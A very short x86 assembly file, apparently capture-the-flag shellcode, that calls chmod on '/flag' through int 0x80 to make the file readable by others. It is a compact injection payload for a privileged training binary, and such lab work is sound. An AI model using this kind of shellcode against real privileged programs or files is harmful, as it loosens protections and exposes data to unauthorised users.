.global _start
_start:
.intel_syntax noprefix
	mov al, 0xf
	mov cl, 0x24
	lea ebx, [rip+flag]
	int 0x80
flag:
	.string "/flag"
